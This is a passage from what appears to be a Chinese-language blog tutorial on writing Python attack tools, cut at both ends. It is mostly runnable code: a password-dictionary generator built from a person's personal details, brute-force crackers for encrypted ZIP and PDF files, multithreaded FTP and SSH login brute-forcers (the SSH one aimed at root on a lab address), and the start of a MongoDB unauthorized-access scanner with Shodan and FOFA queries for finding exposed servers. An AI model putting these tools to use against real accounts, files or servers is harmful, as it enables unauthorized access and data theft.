class="hljs-comment">#获取个人信息存到列表中</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readInformationList</span>():<br>    infoList = []<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#读取个人信息文件</span><br>        info = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;info.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        lines = info.readlines()<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>            <span class="hljs-built_in">print</span>(line.strip().split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>])<br>            infoList.append(line.strip().split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>])<br>            <br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件读取错误&quot;</span>)<br>    <span class="hljs-keyword">return</span> infoList<br><br><span class="hljs-comment">#数字组合</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createNumberList</span>():<br>    numberList = []<br>    words = string.digits   <span class="hljs-comment">#0123456789</span><br>    <span class="hljs-comment">#itertools.product做笛卡尔积</span><br>    itertoolsNumberList = itertools.product(words,repeat=<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">for</span> number <span class="hljs-keyword">in</span> itertoolsNumberList:<br>        numberList.append(<span class="hljs-string">&quot;&quot;</span>.join(number))<br>    <span class="hljs-keyword">return</span> numberList<br><br><span class="hljs-comment">#特殊字符组合</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createSpecialList</span>():<br>    specialList = []<br>    specialWords = string.punctuation   <span class="hljs-comment">#!&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> specialWords:<br>        specialList.append(<span class="hljs-string">&quot;&quot;</span>.join(i))<br>    <span class="hljs-keyword">return</span> specialList<br><br><span class="hljs-comment">#混合组合</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Combination</span>():<br>    infoList = readInformationList()<br>    infoLen = <span class="hljs-built_in">len</span>(infoList)<br>    specialList = createSpecialList()   <span class="hljs-comment">#特殊字符</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(infoLen):<br>        <span class="hljs-comment">#把个人信息大于等于8位的输出到文件  因为可能直接用来当密码</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(infoList[a]) &gt;= <span class="hljs-number">8</span>:<br>            <span class="hljs-comment">#print(infoList[a])</span><br>            dictionaryFile.write(infoList[a]+<span class="hljs-string">&quot;\n&quot;</span>)<br>        <span class="hljs-comment">#不到8位的填充到8位</span><br>        <span class="hljs-keyword">else</span>:<br>            needWords = <span class="hljs-number">8</span>-<span class="hljs-built_in">len</span>(infoList[a])<br>            <br>            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> itertools.permutations(string.digits,needWords):<br>                <span class="hljs-comment">#print(b)</span><br>                <span class="hljs-comment">#print(infoList[a]+&quot;&quot;.join(b))</span><br>                dictionaryFile.write(infoList[a]+<span class="hljs-string">&quot;&quot;</span>.join(b)+<span class="hljs-string">&quot;\n&quot;</span>)<br>            <span class="hljs-comment">#dictionaryFile.write(infoList[a]+&quot;&quot;.join(b)+&quot;\n&quot;)</span><br>        <span class="hljs-comment">#将信息各元素两两拼接</span><br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,infoLen):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(infoList[a]+infoList[c]) &gt;= <span class="hljs-number">8</span>:<br>                <span class="hljs-comment">#print(infoList[a]+infoList[c])</span><br>                dictionaryFile.write(infoList[a]+infoList[c]+<span class="hljs-string">&quot;\n&quot;</span>)<br>        <span class="hljs-comment">#拼接特殊字符</span><br>        <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,infoLen):<br>            <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(specialList)):<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(infoList[a]+specialList[e]+infoList[d]) &gt;= <span class="hljs-number">8</span>:<br>                    <span class="hljs-comment">#特殊字符加尾部</span><br>                    <span class="hljs-comment">#print(infoList[a]+infoList[d]+specialList[e])</span><br>                    dictionaryFile.write(infoList[a]+infoList[d]+specialList[e]+<span class="hljs-string">&quot;\n&quot;</span>)<br>                    <span class="hljs-comment">#特殊字符加中间</span><br>                    <span class="hljs-comment">#print(infoList[a]+specialList[e]+infoList[d])</span><br>                    dictionaryFile.write(infoList[a]+specialList[e]+infoList[d]+<span class="hljs-string">&quot;\n&quot;</span>)<br>                    <span class="hljs-comment">#特殊字符加前面</span><br>                    <span class="hljs-comment">#print(specialList[e]+infoList[a]+infoList[d])</span><br>                    dictionaryFile.write(specialList[e]+infoList[a]+infoList[d]+<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">startSocialDict</span>():<br>    Combination()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    startSocialDict()<br></code></pre></td></tr></table></figure><p>集成到密码生成器中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> social_dict  <span class="hljs-comment">#引入生成社工字典的函数</span><br><span class="hljs-comment">#添加参数</span><br>parser.add_argument(<span class="hljs-string">&quot;-so&quot;</span>,<span class="hljs-string">&quot;--social_dict&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输出社工字典&quot;</span>)<br><span class="hljs-comment">#调用</span><br><span class="hljs-keyword">if</span> args.social_file:<br>   social_dict.startSocialDict()<br></code></pre></td></tr></table></figure><h2 id="zip和pdf密码破解"><a href="#zip和pdf密码破解" class="headerlink" title="zip和pdf密码破解"></a>zip和pdf密码破解</h2><p>原理：密码爆破 </p><p>使用tqdm模块（打印进度条） </p><p>zipfile模块(处理zip文件)</p><p>坑点：</p><p>[解决Python Zipfile 压缩方法无法解压密码文件_zipcrypto-CSDN博客](<a href="https://blog.csdn.net/weixin_45493551/article/details/122948775?ops_request_misc=%7B%22request_id%22:%22169512681716800182182134%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=169512681716800182182134&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-122948775-null-null.142%5Ev94%5Einsert_down28v1&utm_term=%E8%A7%A3%E5%86%B3python">https://blog.csdn.net/weixin_45493551/article/details/122948775?ops_request_misc=%7B%22request%5Fid%22%3A%22169512681716800182182134%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=169512681716800182182134&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-122948775-null-null.142^v94^insert_down28v1&amp;utm_term=解决python</a> zipfile 压缩方法无法解压密码文件&amp;spm&#x3D;1018.2226.3001.4187)</p><p><img src="/img/image-20230919203402127.png" alt="image-20230919203402127"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<span class="hljs-comment">#打印进度条</span><br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> pyzipper<br><br>passwordfile = <span class="hljs-string">&quot;password1.txt&quot;</span><br>zip_file = <span class="hljs-string">&quot;secret.zip&quot;</span> <br><span class="hljs-comment"># zip_file = zipfile.ZipFile(zip_file)</span><br><br>n_words = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">open</span>(passwordfile,<span class="hljs-string">&quot;rb&quot;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;总密码共有: &quot;</span>,n_words)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(passwordfile,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> wordlist:<br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> tqdm(wordlist,total=n_words,unit=<span class="hljs-string">&quot;word&quot;</span>):<br>        pwd = <span class="hljs-built_in">str</span>(word,<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># zip_file.extractall(pwd=pwd)</span><br>            <span class="hljs-comment">#使用pyzipper库用密码读取zip文件</span><br>            <span class="hljs-keyword">with</span> pyzipper.AESZipFile(zip_file, <span class="hljs-string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) <span class="hljs-keyword">as</span> extracted_zip:<br>                extracted_zip.extractall(pwd=<span class="hljs-built_in">str</span>.encode(pwd))<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] password found:&quot;</span>,word.decode().strip())<br>            exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] password not found,try other wordlist&quot;</span>)<br><span class="hljs-comment"># </span><br><br><span class="hljs-comment"># zip_file.extractall(pwd=&quot;123456&quot;.encode(&quot;utf-8&quot;))</span><br><span class="hljs-comment"># import pyzipper</span><br><br><span class="hljs-comment"># password = &#x27;123456&#x27;</span><br><br><span class="hljs-comment"># with pyzipper.AESZipFile(&quot;ppkke.zip&quot;, &#x27;r&#x27;, compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as extracted_zip:</span><br><span class="hljs-comment">#     extracted_zip.extractall(pwd=str.encode(password))</span><br><br></code></pre></td></tr></table></figure><p>pdf破解</p><p>依赖库：pip install pikepdf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">import</span> pikepdf<br><br>passwordfile = <span class="hljs-string">&quot;PasswordFile.txt&quot;</span><br>pdf_file = <span class="hljs-string">&quot;a.pdf&quot;</span> <br><br>n_words = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">open</span>(passwordfile,<span class="hljs-string">&quot;rb&quot;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;总密码共有: &quot;</span>,n_words)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(passwordfile,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> wordlist:<br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> tqdm(wordlist,total=n_words,unit=<span class="hljs-string">&quot;word&quot;</span>):<br>        pwd = <span class="hljs-built_in">str</span>(word,<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment">#使用pikepdf库读取pdf文件</span><br>            <span class="hljs-keyword">with</span> pikepdf.<span class="hljs-built_in">open</span>(pdf_file,password=pwd) <span class="hljs-keyword">as</span> pdf:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; [+] password found:&quot;</span>+pwd)<br>                exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">except</span> pikepdf._core.PasswordError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">continue</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] password not found,try other wordlist&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="FTP暴力破解"><a href="#FTP暴力破解" class="headerlink" title="FTP暴力破解"></a>FTP暴力破解</h2><p>centos FTP服务配置：<a href="https://blog.csdn.net/tangyin09/article/details/131361557">在Centos 7使用FTP服务_centos7 ftp_tangyin09的博客-CSDN博客</a></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">查看ftp服务是否开启<span class="hljs-symbol">:netstat</span> -anput<br>systemctl status vsftpd<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230921154158623.png" alt="image-20230921154158623"></p><p>使用ftpzilla连接测试</p><p><img src="/img/image-20230921155519479.png" alt="image-20230921155519479"></p><p>使用模块：ftplib</p><p>连接失败原因：[Python操作FTP时，TimeoutError: <a href="https://www.cnblogs.com/txmblog/p/12955615.html">WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。 FTPIT技术疑难杂症 - 唐小沫 - 博客园 (cnblogs.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> ftplib<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> queue<br><span class="hljs-comment">#ftp服务器</span><br>host = <span class="hljs-string">&quot;10.210.100.131&quot;</span><br><span class="hljs-comment">#ftp用户</span><br>user = <span class="hljs-string">&quot;loginTest&quot;</span><br><span class="hljs-comment">#ftp端口</span><br>port = <span class="hljs-number">21</span><br><span class="hljs-comment">#密码字典</span><br><span class="hljs-comment">#passwords = open(&quot;PasswordFile.txt&quot;).read().split(&#x27;\n&#x27;)</span><br>passwords = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;PasswordFile.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    passwords = f.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-comment">#队列</span><br>q = queue.Queue()<br><span class="hljs-comment">#线程数</span><br>n_threads = <span class="hljs-number">10</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_ftp</span>():<br>    <span class="hljs-comment">#获取密码</span><br>    password = q.get()<br>    ftp_client = ftplib.FTP()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] trying&quot;</span>,password)<br>    <span class="hljs-keyword">try</span>:<br>        ftp_client.connect(host=host,port=port,timeout=<span class="hljs-number">10</span>)<br>        ftp_client.login(user=user,passwd=password)<br>    <span class="hljs-keyword">except</span> ftplib.error_perm:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;password found :&quot;</span>,password)<br>        ftp_client.quit()<br>        <span class="hljs-keyword">with</span> q.mutex:<br>            q.queue.clear()<br>            q.all_tasks_done.notify_all()<br>            q.unfinished_tasks = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">try</span>:<br>            q.task_done()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>    <span class="hljs-comment">#将密码传入队列</span><br>    q.put(password)<br><br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n_threads):<br>    thread = Thread(target=connect_ftp)<br>    thread.daemon = <span class="hljs-literal">True</span><br>    thread.start()<br><br>q.join()<br><br></code></pre></td></tr></table></figure><p>v2版本  采用传统多线程 与端口扫描的一样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> ftplib<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-comment">#from multiprocessing import Queue</span><br><span class="hljs-keyword">import</span> queue<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-comment">#ftp服务器</span><br>host = <span class="hljs-string">&quot;xxx&quot;</span><br><span class="hljs-comment">#ftp用户</span><br>user = <span class="hljs-string">&quot;loginTest&quot;</span><br><span class="hljs-comment">#ftp端口</span><br>port = <span class="hljs-number">21</span><br><span class="hljs-comment">#密码字典</span><br><span class="hljs-comment">#passwords = open(&quot;PasswordFile.txt&quot;).read().split(&#x27;\n&#x27;)</span><br>passwords = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;PasswordFile.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    passwords = f.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br><span class="hljs-comment">#线程数</span><br>n_threads = <span class="hljs-number">10</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ftp_crack</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment">#print(&quot;666&quot;)</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            <span class="hljs-comment">#获取密码</span><br>            password = self.queue.get()<br>            ftp_client = ftplib.FTP()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] trying &quot;</span>+password)<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment">#尝试ftp连接</span><br>                ftp_client.set_pasv(<span class="hljs-literal">False</span>)<br>                ftp_client.connect(host=host,port=port,timeout=<span class="hljs-number">5</span>)<br>                ftp_client.login(user=user,passwd=password)<br>            <span class="hljs-keyword">except</span> ftplib.error_perm:<br>                <span class="hljs-keyword">pass</span><br>                <span class="hljs-comment">#return False</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] password found :&quot;</span>,password)<br>                ftp_client.quit()<br>                <span class="hljs-comment">#清空队列</span><br>                <span class="hljs-keyword">with</span> self.queue.mutex:<br>                    self.queue.queue.clear()<br>                    self.queue.all_tasks_done.notify_all()<br>                    self.queue.unfinished_tasks = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">finally</span>:<br>                <span class="hljs-keyword">try</span>:<br>                    self.queue.task_done()<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    exit(<span class="hljs-number">0</span>)<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-comment">#队列</span><br>    q = queue.Queue()<br>    threads = []<br>    <span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>        <span class="hljs-comment">#将密码传入队列</span><br>        <span class="hljs-comment">#print(password)</span><br>        q.put(password)<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n_threads):<br>        threads.append(ftp_crack(q))<br>        <br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    start()<br><br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230921203353272.png" alt="image-20230921203353272"></p><h2 id="SSH密码暴力破解"><a href="#SSH密码暴力破解" class="headerlink" title="SSH密码暴力破解"></a>SSH密码暴力破解</h2><p>使用模块：paramiko 自动多线程</p><p>ssh连接报错：</p><p>1.超时</p><p>2.授权问题</p><p>3.密码错误</p><p><a href="https://www.cnblogs.com/txmblog/p/12955615.html">https://www.cnblogs.com/txmblog/p/12955615.html</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> paramiko<br><span class="hljs-keyword">import</span> time<br><br>host = <span class="hljs-string">&quot;10.210.100.131&quot;</span><br>user = <span class="hljs-string">&quot;root&quot;</span><br>port = <span class="hljs-number">22</span><br>passwords = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;PasswordFile.txt&quot;</span>).read().split(<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connet_ssh</span>(<span class="hljs-params">password</span>):<br>    ssh_client = paramiko.SSHClient()<br>    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>    <span class="hljs-keyword">try</span>:<br>        ssh_client.connect(hostname=host,password=password,username=user,timeout=<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">except</span> socket.timeout:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;连接超时&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> paramiko.AuthenticationException:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] 密码错误 <span class="hljs-subst">&#123;user&#125;</span>:<span class="hljs-subst">&#123;password&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> paramiko.SSHException:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;内部错误，等待重连&quot;</span>)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> connet_ssh(password)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] password found: &quot;</span>,password)<br>        exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>    <span class="hljs-keyword">if</span> connet_ssh(password):<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>存在问题，多线程有点慢  待优化 </p><h2 id="mongodb未授权扫描器"><a href="#mongodb未授权扫描器" class="headerlink" title="mongodb未授权扫描器"></a>mongodb未授权扫描器</h2><p><a href="https://www.freebuf.com/vuls/277847.html">数据库安全之MongoDB渗透 - FreeBuf网络安全行业门户</a></p><p>shodan语法：product:”MongoDB”</p><p>fofa:””MongoDB” &amp;&amp; protocol&#x3D;”mongodb””</p><p>mongodb未授权挖掘：</p><p>1.扫描端口 默认端口：27017  （socket）</p><p>2.尝试连接即可（使用pymongo的MongoClient连接）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> pymongo<br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-comment">#用socket扫描端口</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_port</span>(<span class="hljs-params">ip</span>):<br>    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>    s.settimeout(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((ip,<span class="hljs-number">27017</span>))<br>        <span class="hljs-built_in">print</span>(<span 